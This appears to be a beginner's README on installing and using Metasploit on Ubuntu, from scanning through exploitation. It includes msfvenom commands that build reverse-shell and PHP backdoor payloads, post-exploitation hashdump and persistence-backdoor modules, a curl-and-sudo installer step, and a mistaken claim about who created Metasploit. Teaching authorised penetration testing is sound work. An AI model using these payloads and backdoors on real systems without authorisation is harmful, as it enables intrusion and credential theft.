# PICA - Complete Beginner's Guide to Metasploit in Ubuntu

## What is Metasploit?

Metasploit is a powerful open-source cybersecurity framework that helps security professionals test the security of computer systems. It contains a collection of security tools and exploits that can be used to test vulnerabilities in networks, web applications, and servers. This guide will walk you through everything you need to know, from installation to advanced usage.

## Installation Guide

Below are the commands to install Metasploit on Ubuntu. You can copy and paste these commands into your terminal:

```bash
# This command updates the list of available packages. You should run this before installing new software.
sudo apt update

# This command installs the Metasploit Framework package from the Ubuntu repositories.
sudo apt install metasploit-framework

# Alternative installation method: If the above method doesn't work, you can use this method.
# This downloads an installation script from the official Metasploit website.
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall

# This makes the downloaded script executable (gives permission to run it).
chmod +x msfinstall

# This runs the installation script with administrator privileges.
sudo ./msfinstall
```

## Basic Commands to Get Started

After installation, here are the basic commands to start using Metasploit:

```bash
# This command starts the Metasploit console, which is the main interface for using Metasploit.
# When you see "msf6 >" or similar, you're in the Metasploit console.
msfconsole

# This command updates Metasploit to the latest version, ensuring you have all the newest tools and exploits.
msfupdate

# Metasploit works best with a database. These commands start and enable the PostgreSQL database.
# The database helps store scan results and manage your security testing activities.
sudo systemctl start postgresql
sudo systemctl enable postgresql

# This initializes the Metasploit database for first-time use.
# It creates necessary tables and prepares the database to store your scan information.
sudo msfdb init
```

## Essential Metasploit Commands Explained

Once you're inside the Metasploit console (after running `msfconsole`), you can use these commands:

```
# This checks if Metasploit is successfully connected to the database.
# If it shows "connected," you're good to go.
db_status

# Workspaces help you organize different security testing projects.
# Think of them like folders for different testing assignments.
workspace -h                # Shows help information about the workspace command
workspace -a [name]         # Creates a new workspace with the name you specify
workspace -d [name]         # Deletes the workspace with the name you specify
workspace [name]            # Switches to the workspace with the name you specify

# Scanning Commands - These help you gather information about target systems
db_nmap [options] [targets] # Runs the Nmap tool to scan networks and stores results in the database
                            # Example: db_nmap -sV 192.168.1.100 (scans a specific IP address for service info)
                            # -sV: Detects services and their versions running on ports
                            # -sS: Performs a "stealth" scan (SYN scan)
                            # -A: Aggressive scan (OS detection, version detection, script scanning, traceroute)
                            # -p-: Scans all 65535 ports (by default, Nmap only scans common ports)

db_import [file]            # Imports scan results from a file into the Metasploit database
                            # Example: db_import nmap_results.xml

hosts                       # Lists all the hosts (computers) discovered during your scans
                            # This shows IP addresses, operating systems, and other details

services                    # Lists all services (running programs like web servers, FTP, etc.) found on hosts
                            # Shows port numbers, service names, and status

vulns                       # Lists all vulnerabilities that have been detected on the hosts
                            # This shows which security weaknesses exist on each system
```

## Scanning Modules Explained in Detail

Metasploit has many scanning modules. Here's what they do and how to use them:

### Network Scanners (Finding What's on the Network)

```
# Port scanners - These find open ports (communication channels) on target computers
use auxiliary/scanner/portscan/tcp       # Scans for open TCP ports (used by most internet services)
use auxiliary/scanner/portscan/syn       # Faster "stealth" port scanner that's harder to detect

# Once you select a scanner with the "use" command, type "show options" to see what settings you need to configure
# Then use "set RHOSTS 192.168.1.100" (replace with your target IP) to specify the target
# Finally, type "run" to start the scan

# Service identification - These identify what programs are running on open ports
use auxiliary/scanner/discovery/udp_sweep    # Finds services using UDP protocol (like video streaming, DNS)
use auxiliary/scanner/smb/smb_version        # Detects Windows file sharing service and version
use auxiliary/scanner/ftp/ftp_version        # Detects FTP (file transfer) servers and versions
use auxiliary/scanner/ssh/ssh_version        # Detects SSH (secure shell) servers and versions
use auxiliary/scanner/telnet/telnet_version  # Detects Telnet servers (remote login) and versions
use auxiliary/scanner/http/http_version      # Detects web servers and versions

# SMB scanners - These check Windows file sharing services for information
use auxiliary/scanner/smb/smb_enumshares     # Lists shared folders on Windows computers
use auxiliary/scanner/smb/smb_login          # Tests username/password combinations on Windows
use auxiliary/scanner/smb/smb_lookupsid      # Finds user accounts on Windows systems

# Database scanners - These check for database servers and weaknesses
use auxiliary/scanner/mysql/mysql_login      # Tests username/password combinations on MySQL databases
use auxiliary/scanner/mysql/mysql_version    # Detects MySQL database versions
use auxiliary/scanner/mssql/mssql_login      # Tests username/password combinations on Microsoft SQL Server
use auxiliary/scanner/postgres/postgres_login # Tests username/password combinations on PostgreSQL databases

# Web application scanners - These find information about websites and web applications
use auxiliary/scanner/http/dir_scanner       # Looks for hidden directories on websites
use auxiliary/scanner/http/files_dir         # Searches for sensitive files on web servers
use auxiliary/scanner/http/http_login        # Tests username/password combinations on websites
use auxiliary/scanner/http/wordpress_scanner # Scans WordPress sites for vulnerable plugins/themes
```

### Vulnerability Scanners (Finding Security Weaknesses)

```
# What is a vulnerability? It's a weakness in a system that could be exploited by attackers.
# These scanners find specific security issues:

# General vulnerability scanners
use auxiliary/scanner/smb/smb_ms17_010      # Checks for EternalBlue vulnerability (used in major ransomware attacks)
use auxiliary/scanner/http/apache_optionsbleed  # Checks for a specific Apache web server vulnerability
use auxiliary/scanner/http/shellshock       # Checks for the Shellshock vulnerability in web servers

# Industrial control systems scanners (for factory/utility systems)
use auxiliary/scanner/scada/modbusclient    # Scans industrial control systems using Modbus protocol
use auxiliary/scanner/scada/modbus_findunitid # Identifies Modbus devices on networks

# VoIP scanners (for internet phone systems)
use auxiliary/scanner/sip/options           # Scans Voice over IP systems
use auxiliary/scanner/sip/enumerator        # Enumerates SIP accounts on VoIP systems
```

## How to Use Exploits (Taking Advantage of Vulnerabilities)

After finding vulnerabilities, you might want to test if they can be exploited (always with proper authorization!):

```
# Searching for exploits in the database
search [keyword]                    # Searches for exploits containing a keyword
                                    # Example: search apache
search platform:windows type:exploit # Searches for Windows exploits only

# Using an exploit
use [exploit_path]                  # Selects an exploit to use
                                    # Example: use exploit/windows/smb/ms17_010_eternalblue

# Setting options for the exploit
show options                        # Shows what settings need to be configured
set [option] [value]                # Sets a specific option
                                    # Example: set RHOSTS 192.168.1.100
setg [option] [value]               # Sets a global option (applies to all modules)

# Running the exploit
exploit                             # Launches the exploit attempt
run                                 # Another way to launch the exploit (same as exploit)

# Managing sessions (connections to compromised systems)
background                          # Puts the current session in the background
sessions -l                         # Lists all active sessions
sessions -i [id]                    # Interacts with a specific session by ID number
```

## Post-Exploitation (What to Do After Gaining Access)

Once you've successfully exploited a system (with proper authorization), these commands help gather information:

```
# These commands gather information from compromised systems
use post/windows/gather/hashdump    # Extracts password hashes from Windows systems
use post/linux/gather/hashdump      # Extracts password hashes from Linux systems

# Information gathering modules
use post/windows/gather/enum_applications # Lists installed applications on Windows
use post/multi/gather/env                # Shows environment variables (system settings)
use post/linux/gather/enum_system        # Gathers system information from Linux

# Privilege escalation (gaining higher-level access)
use post/multi/recon/local_exploit_suggester # Suggests exploits to gain higher privileges
use post/windows/escalate/bypassuac    # Attempts to bypass Windows User Account Control

# Persistence (maintaining access for later)
use post/windows/manage/persistence_exe # Sets up a backdoor on Windows
use post/linux/manage/persistence_cron  # Sets up a backdoor on Linux using scheduled tasks
```

## Creating Standalone Payloads (Code That Runs on Target Systems)

Payloads are code that run on target systems. Here's how to create them:

```
# Listing available payloads
show payloads                       # Shows all available payload options

# Generating a standalone payload (a file that can be executed on a target)
msfvenom -p [payload] LHOST=[ip] LPORT=[port] -f [format] -o [output_file]
# -p: Specifies the payload
# LHOST: Your IP address (where the target will connect back to)
# LPORT: The port on your machine to listen on
# -f: The file format
# -o: The output file name

# Common examples:
# Creating a Windows executable that connects back to your machine
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe

# Creating a Linux executable
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf

# Creating a PHP web backdoor
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o payload.php
```

## Advanced Usage Techniques

These advanced features help automate and extend Metasploit:

```
# Resource scripts (automating commands)
makerc [filename]                   # Saves your current console commands to a file
                                    # Example: makerc myscan.rc
resource [filename]                 # Runs commands from a resource file
                                    # Example: resource myscan.rc

# Using proxies (routing traffic through another server)
set Proxies HTTP:127.0.0.1:8080     # Routes traffic through a local proxy
set ReverseAllowProxy true          # Allows reverse connections through proxy

# IPv6 support (for newer network protocols)
set RHOST ::1                       # Sets an IPv6 target address
set UseIPv6 true                    # Enables IPv6 support
```

## Using Metasploit's API with Python

Metasploit provides an API that can be accessed with Python code. Here's how to set it up:

1. Start the RPC server (remote procedure call) to allow external connections:
```bash
# This starts the API server with a password of your choice
# -P: password
# -S: use SSL (encryption)
# -a: address to listen on (127.0.0.1 means local machine only)
msfrpcd -P your_password -S -a 127.0.0.1
```

2. Connect using Python - See the metasploit_api.py file in this repository for the complete code.

## Integrating with Other Security Tools

Metasploit can work with other security tools:

```bash
# Nessus (vulnerability scanner)
load nessus                         # Loads the Nessus plugin
nessus_connect [username]:[password]@[host]:[port]  # Connects to a Nessus server

# Nexpose (vulnerability management platform)
load nexpose                        # Loads the Nexpose plugin
nexpose_connect [username]:[password]@[host]:[port] # Connects to a Nexpose server

# OpenVAS (open-source vulnerability scanner)
load openvas                        # Loads the OpenVAS plugin
openvas_connect [username]:[password]@[host]:[port] # Connects to an OpenVAS server
```

## Best Practices for Responsible Testing

Security testing is a serious responsibility. Always follow these guidelines:

1. **Only test systems you own or have explicit permission to test**. Unauthorized testing is illegal.
2. Document all your activities - keep detailed records of what tests you run and when.
3. Use dedicated testing networks when possible to avoid affecting production systems.
4. Keep Metasploit updated with the latest version to have the most current security tools.
5. Use workspaces to organize different projects and keep your results separated.
6. Regularly back up your Metasploit database to avoid losing your work.

## Troubleshooting Common Problems

If you encounter issues with Metasploit, try these solutions:

```bash
# Database connection issues
sudo msfdb reinit                   # Reinitializes the database from scratch

# Module loading issues
reload_all                          # Reloads all modules in Metasploit

# Update issues
apt clean                           # Cleans the package cache
apt update                          # Updates package lists
apt install metasploit-framework    # Reinstalls Metasploit

# Permission issues
sudo chown -R $(whoami):$(whoami) ~/.msf4  # Fixes ownership of Metasploit files
```

## Glossary of Cybersecurity Terms

* **Vulnerability**: A weakness in a system that could be exploited by attackers.
* **Exploit**: A piece of code that takes advantage of a vulnerability.
* **Payload**: Code that runs on a target system after successful exploitation.
* **Meterpreter**: An advanced payload provided by Metasploit that gives extended control over a target.
* **Port**: A virtual point where network connections start and end. Each port is associated with a specific process or service.
* **Service**: A program running on a computer that provides functionality to other programs or users.
* **SMB**: Server Message Block, a protocol used for file sharing on Windows networks.
* **SSH**: Secure Shell, a protocol for secure remote login.
* **HTTP/HTTPS**: Protocols used for accessing websites.
* **Privilege Escalation**: The process of gaining higher-level permissions on a computer system.
* **Backdoor**: A method of bypassing normal authentication to maintain access to a compromised system.

## Getting Help

If you're stuck on a specific Metasploit command, you can always type `help [command]` within the Metasploit console to get more information.

For additional help, these resources are valuable:
- Offensive Security (creators of Metasploit): https://www.offensive-security.com/
- Metasploit Documentation: https://docs.metasploit.com/
- Rapid7 (maintainers of Metasploit): https://www.rapid7.com/products/metasploit/ 